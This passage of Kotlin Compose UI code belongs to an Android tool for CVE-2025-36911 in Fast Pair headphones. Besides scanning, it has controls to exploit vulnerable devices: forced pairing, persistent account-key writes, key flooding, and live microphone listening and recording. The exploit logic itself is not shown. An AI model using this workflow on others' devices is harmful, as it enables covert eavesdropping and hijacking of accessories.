            DeviceStatus.TESTING -> TestingBlue
            DeviceStatus.ERROR -> WarningOrange
            DeviceStatus.NOT_TESTED -> TextSecondary
        }, label = "statusColor"
    )

    var showMagicDialog by remember { mutableStateOf(false) }

    Card(
        modifier = Modifier.fillMaxWidth().then(if (device.status == DeviceStatus.VULNERABLE) Modifier.border(1.dp, VulnerableRed.copy(alpha = 0.5f), RoundedCornerShape(12.dp)) else Modifier),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.Top) {
                Row(modifier = Modifier.weight(1f), verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.size(44.dp).clip(CircleShape).background(statusColor.copy(alpha = 0.15f)), contentAlignment = Alignment.Center) {
                        Icon(Icons.Default.Headphones, null, tint = statusColor, modifier = Modifier.size(24.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(device.displayName, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold, color = TextPrimary, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        device.manufacturer?.let { Text(it, style = MaterialTheme.typography.bodySmall, color = TextSecondary) }
                        Text(device.address, style = MaterialTheme.typography.labelSmall, color = TextTertiary, fontFamily = FontFamily.Monospace)
                    }
                }
                StatusBadge(device.status)
            }

            Spacer(Modifier.height(12.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    InfoChip(when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> Icons.Default.NetworkWifi; SignalStrength.FAIR -> Icons.Default.Wifi; else -> Icons.Default.WifiOff }, "${device.rssi} dBm", when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> SignalStrong; SignalStrength.FAIR -> SignalMedium; else -> SignalWeak })
                    InfoChip(if (device.isPairingMode) Icons.Default.Link else Icons.Default.LinkOff, if (device.isPairingMode) "Pairing" else "Idle", if (device.isPairingMode) TestingBlue else TextSecondary)
                }
                if (!device.isPairingMode && device.status != DeviceStatus.TESTING && (device.status == DeviceStatus.NOT_TESTED || device.status == DeviceStatus.ERROR)) {
                    FilledTonalButton(onClick = onTest, colors = ButtonDefaults.filledTonalButtonColors(containerColor = CyanPrimary.copy(alpha = 0.2f), contentColor = CyanPrimary), contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp), modifier = Modifier.height(32.dp)) {
                        Icon(Icons.Default.PlayArrow, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Test", fontSize = 12.sp)
                    }
                }
                if (device.status == DeviceStatus.TESTING) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = TestingBlue)
                        Spacer(Modifier.width(8.dp))
                        Text("Testing...", fontSize = 12.sp, color = TestingBlue)
                    }
                }
            }

            if (device.isPairingMode) {
                Spacer(Modifier.height(8.dp))
                Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(TestingBlue.copy(alpha = 0.1f)).padding(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Info, null, tint = TestingBlue, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Device in pairing mode - test not applicable", style = MaterialTheme.typography.labelSmall, color = TestingBlue)
                }
            }

            // Vulnerable device controls
            if (device.status == DeviceStatus.VULNERABLE) {
                Spacer(Modifier.height(12.dp))

                exploitResult?.let { result ->
                    val bgColor = when { result.startsWith("PAIRED") || result.startsWith("KEY") -> PatchedGreen; result.startsWith("PARTIAL") -> WarningOrange; result.startsWith("FAILED") -> VulnerableRed; else -> CyanPrimary }
                    Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(bgColor.copy(alpha = 0.15f)).padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
                        Icon(when { result.startsWith("PAIRED") || result.startsWith("KEY") -> Icons.Default.CheckCircle; result.startsWith("PARTIAL") -> Icons.Default.Warning; result.startsWith("FAILED") -> Icons.Default.Error; else -> Icons.Default.Sync }, null, tint = bgColor, modifier = Modifier.size(16.dp))
                        Spacer(Modifier.width(8.dp))
                        Text(result, style = MaterialTheme.typography.labelSmall, color = TextPrimary, maxLines = 2, overflow = TextOverflow.Ellipsis)
                    }
                    Spacer(Modifier.height(8.dp))
                }

                audioState?.message?.let { msg ->
                    Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(when { audioState.isListening -> Color(0xFFE91E63); audioState.isRecording -> VulnerableRed; audioState.isConnected -> PatchedGreen; else -> CyanPrimary }.copy(alpha = 0.2f)).padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
                        Icon(if (audioState.isListening || audioState.isRecording) Icons.Default.Mic else Icons.Default.Headset, null, tint = if (audioState.isListening) Color(0xFFE91E63) else if (audioState.isRecording) VulnerableRed else PatchedGreen, modifier = Modifier.size(16.dp))
                        Spacer(Modifier.width(8.dp))
                        Text(msg, style = MaterialTheme.typography.labelSmall, color = TextPrimary)
                    }
                    Spacer(Modifier.height(8.dp))
                }

                val isOperating = exploitResult?.let { it.startsWith("Connecting") || it.startsWith("Writing") || it.startsWith("Flooding") } == true

                // Row 1: Magic button
                Button(onClick = { showMagicDialog = true }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = VulnerableRed), enabled = !isOperating) {
                    Icon(Icons.Default.AutoAwesome, null, Modifier.size(18.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Magic - Pair Device", fontWeight = FontWeight.Bold)
                }

                // Row 2: Audio controls (only if paired)
                if (isPaired) {
                    Spacer(Modifier.height(8.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        if (audioState?.isConnected == true) {
                            // Live listen button
                            Button(
                                onClick = { if (audioState.isListening) onStopListening() else onStartListening() },
                                modifier = Modifier.weight(1f),
                                colors = ButtonDefaults.buttonColors(containerColor = if (audioState.isListening) VulnerableRed else Color(0xFFE91E63))
                            ) {
                                Icon(if (audioState.isListening) Icons.Default.Stop else Icons.Default.Hearing, null, Modifier.size(16.dp))
                                Spacer(Modifier.width(4.dp))
                                Text(if (audioState.isListening) "Stop" else "Live", fontSize = 13.sp)
                            }
                            // Record button
                            Button(
                                onClick = { if (audioState.isRecording) onStopRecording() else onStartRecording() },
                                modifier = Modifier.weight(1f),
                                colors = ButtonDefaults.buttonColors(containerColor = if (audioState.isRecording) VulnerableRed else PatchedGreen)
                            ) {
                                Icon(if (audioState.isRecording) Icons.Default.Stop else Icons.Default.FiberManualRecord, null, tint = if (audioState.isRecording) Color.White else VulnerableRed, modifier = Modifier.size(16.dp))
                                Spacer(Modifier.width(4.dp))
                                Text(if (audioState.isRecording) "Stop" else "Record", fontSize = 13.sp)
                            }
                        } else {
                            Button(onClick = onConnectHfp, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) {
                                Icon(Icons.Default.Headset, null, Modifier.size(18.dp))
                                Spacer(Modifier.width(8.dp))
                                Text("Connect Audio (HFP)")
                            }
                        }
                    }
                }

                // Row 3: Account key operations
                Spacer(Modifier.height(8.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedButton(onClick = onWriteAccountKey, modifier = Modifier.weight(1f), colors = ButtonDefaults.outlinedButtonColors(contentColor = WarningOrange), enabled = !isOperating) {
                        Icon(Icons.Default.Key, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Key", fontSize = 13.sp)
                    }
                    OutlinedButton(onClick = onFloodKeys, modifier = Modifier.weight(1f), colors = ButtonDefaults.outlinedButtonColors(contentColor = VulnerableRed), enabled = !isOperating) {
                        Icon(Icons.Default.Flood, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Flood", fontSize = 13.sp)
                    }
                }
            }
        }
    }

    if (showMagicDialog) {
        AlertDialog(
            onDismissRequest = { showMagicDialog = false },
            icon = { Icon(Icons.Default.Warning, null, tint = VulnerableRed, modifier = Modifier.size(48.dp)) },
            title = { Text("Exploit Vulnerable Device?", fontWeight = FontWeight.Bold) },
            text = {
                Column {
                    Text("This will attempt to:")
                    Spacer(Modifier.height(8.dp))
                    BulletPoint("Perform Fast Pair Key-Based Pairing")
                    BulletPoint("Extract BR/EDR address")
                    BulletPoint("Initiate Bluetooth Classic bonding")
                    BulletPoint("Write Account Key for persistence")
                    Spacer(Modifier.height(12.dp))
                    Text("After success, use 'Connect Audio' for microphone access.", style = MaterialTheme.typography.bodySmall, color = CyanPrimary)
                    Spacer(Modifier.height(8.dp))
                    Text("Only test devices you own!", style = MaterialTheme.typography.bodySmall, color = VulnerableRed, fontWeight = FontWeight.SemiBold)
                }
            },
            confirmButton = { Button(onClick = { showMagicDialog = false; onExploit() }, colors = ButtonDefaults.buttonColors(containerColor = VulnerableRed)) { Text("Execute") } },
            dismissButton = { TextButton(onClick = { showMagicDialog = false }) { Text("Cancel", color = TextSecondary) } },
            containerColor = DarkSurface
        )
    }
}

@Composable
fun InfoChip(icon: ImageVector, text: String, color: Color) {
    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clip(RoundedCornerShape(4.dp)).background(color.copy(alpha = 0.1f)).padding(horizontal = 6.dp, vertical = 2.dp)) {
        Icon(icon, null, tint = color, modifier = Modifier.size(12.dp))
        Spacer(Modifier.width(4.dp))
        Text(text, style = MaterialTheme.typography.labelSmall, color = color)
    }
}

@Composable
fun StatusBadge(status: DeviceStatus) {
    val infiniteTransition = rememberInfiniteTransition(label = "status")
    val alpha by infiniteTransition.animateFloat(0.7f, 1f, infiniteRepeatable(tween(500), RepeatMode.Reverse), label = "alpha")
    val (text, color, icon) = when (status) {
        DeviceStatus.NOT_TESTED -> Triple("Not Tested", TextSecondary, Icons.Outlined.HelpOutline)
        DeviceStatus.TESTING -> Triple("Testing", TestingBlue, Icons.Default.Sync)
        DeviceStatus.VULNERABLE -> Triple("VULNERABLE", VulnerableRed, Icons.Default.Warning)
        DeviceStatus.PATCHED -> Triple("Patched", PatchedGreen, Icons.Default.CheckCircle)
        DeviceStatus.ERROR -> Triple("Error", WarningOrange, Icons.Default.Error)
    }
    Surface(color = color.copy(alpha = if (status == DeviceStatus.VULNERABLE) alpha * 0.2f else 0.15f), shape = RoundedCornerShape(8.dp)) {
        Row(modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(icon, null, tint = if (status == DeviceStatus.VULNERABLE) color.copy(alpha = alpha) else color, modifier = Modifier.size(14.dp))
            Spacer(Modifier.width(4.dp))
            Text(text, color = if (status == DeviceStatus.VULNERABLE) color.copy(alpha = alpha) else color, style = MaterialTheme.typography.labelSmall, fontWeight = FontWeight.SemiBold)
        }
    }
}

@Composable
fun EmptyStateCard(isScanning: Boolean) {
    Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(16.dp)) {
        Column(modifier = Modifier.fillMaxWidth().padding(32.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(if (isScanning) Icons.Default.BluetoothSearching else Icons.Default.BluetoothDisabled, null, tint = TextSecondary, modifier = Modifier.size(64.dp))
            Spacer(Modifier.height(16.dp))
            Text(if (isScanning) "Searching..." else "No devices", style = MaterialTheme.typography.titleMedium, color = TextPrimary, textAlign = TextAlign.Center)
            Text(if (isScanning) "Looking for Fast Pair devices" else "Start scanning to discover devices", style = MaterialTheme.typography.bodySmall, color = TextSecondary, textAlign = TextAlign.Center)
        }
    }
}

@Composable
fun DisclaimerDialog(onAccept: () -> Unit) {
    AlertDialog(
        onDismissRequest = { },
        icon = { Icon(Icons.Default.Security, null, tint = CyanPrimary, modifier = Modifier.size(48.dp)) },
        title = { Text("Security Research Tool", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
        text = {
            Column {
                Text("WhisperPair is a DEFENSIVE security tool for CVE-2025-36911 vulnerability testing.")
                Spacer(Modifier.height(12.dp))
                BulletPoint("Only test devices you own or have permission to test")
                BulletPoint("Helps identify devices needing firmware updates")
                BulletPoint("For security research purposes only")
                Spacer(Modifier.height(12.dp))
                Text("By using this tool, you agree to use it responsibly.", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
            }
        },
        confirmButton = { Button(onClick = onAccept, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("I Understand") } },
        containerColor = DarkSurface
    )
}

@Composable
fun BulletPoint(text: String) {
    Row(modifier = Modifier.padding(vertical = 2.dp)) {
        Text("• ", color = CyanPrimary)
        Text(text, style = MaterialTheme.typography.bodySmall)
    }
}

@Composable
fun AboutDialog(onDismiss: () -> Unit) {
    val uriHandler = LocalUriHandler.current
    val scrollState = rememberScrollState()

    AlertDialog(
        onDismissRequest = onDismiss,
        title = {
            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
                Image(
                    painter = painterResource(R.mipmap.ic_launcher_foreground),
                    contentDescription = "WhisperPair",
                    modifier = Modifier.size(72.dp)
                )
                Spacer(Modifier.height(8.dp))
                Text("WhisperPair v1.0", fontWeight = FontWeight.Bold)
                Text("CVE-2025-36911 Vulnerability Scanner", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
            }
        },
        text = {
            Column(modifier = Modifier.verticalScroll(scrollState)) {
                // Developer
                SectionHeader("Developer")
                LinkRow("@ZalexDev", "https://github.com/zalexdev", uriHandler)

                Spacer(Modifier.height(12.dp))

                // Links
                SectionHeader("Links")
                LinkRow("Latest Release", "https://github.com/zalexdev/whisper-pair-app", uriHandler)
                LinkRow("WhisperPair Website", "https://whisperpair.eu", uriHandler)
                LinkRow("CVE Entry", "https://www.cve.org/CVERecord?id=CVE-2025-36911", uriHandler)

                Spacer(Modifier.height(12.dp))

                // Support
                val context = LocalContext.current
                val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager

                SectionHeader("Support Development")

                // Star on GitHub
                Row(
                    modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(CyanPrimary.copy(alpha = 0.1f)).clickable { uriHandler.openUri("https://github.com/zalexdev/whisper-pair-app") }.padding(10.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.Star, null, tint = CyanPrimary, modifier = Modifier.size(20.dp))
                    Spacer(Modifier.width(8.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text("Star on GitHub", style = MaterialTheme.typography.labelMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                        Text("Help others discover WhisperPair", style = MaterialTheme.typography.labelSmall, color = TextSecondary)
                    }
                    Icon(Icons.Default.OpenInNew, null, tint = CyanPrimary, modifier = Modifier.size(16.dp))
                }

                Spacer(Modifier.height(8.dp))

                // TRC20 Donation
                Row(
                    modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(WarningOrange.copy(alpha = 0.1f)).clickable {
                        clipboardManager.setPrimaryClip(android.content.ClipData.newPlainText("TRC20 Address", "TXVt15poW3yTBb7zSdaBRuyFsGCpFyg8CU"))
                        Toast.makeText(context, "Address copied!", Toast.LENGTH_SHORT).show()
                    }.padding(10.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.AccountBalanceWallet, null, tint = WarningOrange, modifier = Modifier.size(20.dp))
                    Spacer(Modifier.width(8.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text("TRC20 (USDT)", style = MaterialTheme.typography.labelSmall, color = WarningOrange)
                        Text("TXVt15poW3yTBb7zSdaBRuyFsGCpFyg8CU", style = MaterialTheme.typography.labelSmall, fontFamily = FontFamily.Monospace, color = TextPrimary)
                    }
                    Icon(Icons.Default.ContentCopy, null, tint = WarningOrange, modifier = Modifier.size(16.dp))
                }

                Spacer(Modifier.height(16.dp))

                // Research Team
                SectionHeader("Original Research Team")
                Text("KU Leuven, Belgium", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
                Spacer(Modifier.height(8.dp))

                Text("COSIC Group:", style = MaterialTheme.typography.labelMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                LinkRow("Sayon Duttagupta*", "https://www.esat.kuleuven.be/cosic/people/person/?u=u0129899", uriHandler)
                LinkRow("Nikola Antonijević", "https://www.esat.kuleuven.be/cosic/people/person/?u=u0148369", uriHandler)
                LinkRow("Bart Preneel", "https://homes.esat.kuleuven.be/~preneel/", uriHandler)

                Spacer(Modifier.height(4.dp))
                Text("DistriNet Group:", style = MaterialTheme.typography.labelMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                LinkRow("Seppe Wyns*", "https://seppe.io", uriHandler)
                LinkRow("Dave Singelée", "https://sites.google.com/site/davesingelee", uriHandler)
                Text("* Primary authors", style = MaterialTheme.typography.labelSmall, color = TextTertiary)

                Spacer(Modifier.height(12.dp))

                // Resources
                SectionHeader("Resources")
                LinkRow("Vulnerable Devices List", "https://whisperpair.eu/vulnerable-devices", uriHandler)
                LinkRow("Demo Video", "https://www.youtube.com/watch?v=-j45ShJINtc", uriHandler)
                LinkRow("COSIC Research Group", "https://www.esat.kuleuven.be/cosic", uriHandler)

                Spacer(Modifier.height(12.dp))

                // Media
                SectionHeader("Media Coverage")
                LinkRow("WIRED", "https://www.wired.com/story/google-fast-pair-bluetooth-audio-accessories-vulnerability-patches/", uriHandler)
                LinkRow("9to5Google", "https://9to5google.com/2026/01/15/google-fast-pair-devices-exploit-whisperpair/", uriHandler)

                Spacer(Modifier.height(12.dp))

                // Funding
                Text("Original research funded by Flemish Government Cybersecurity Research Program (VOEWICS02)", style = MaterialTheme.typography.labelSmall, color = TextTertiary, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth())
            }
        },
        confirmButton = { TextButton(onClick = onDismiss) { Text("Close", color = CyanPrimary) } },
        containerColor = DarkSurface
    )
}

@Composable
fun SectionHeader(text: String) {
    Text(text, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold, color = TextPrimary)
    Spacer(Modifier.height(4.dp))
}

@Composable
fun LinkRow(text: String, url: String, uriHandler: androidx.compose.ui.platform.UriHandler) {
    Row(modifier = Modifier.fillMaxWidth().clickable { uriHandler.openUri(url) }.padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
        Icon(Icons.Default.OpenInNew, null, tint = CyanPrimary, modifier = Modifier.size(14.dp))
        Spacer(Modifier.width(8.dp))
        Text(text, style = MaterialTheme.typography.bodySmall, color = CyanPrimary)
    }
}
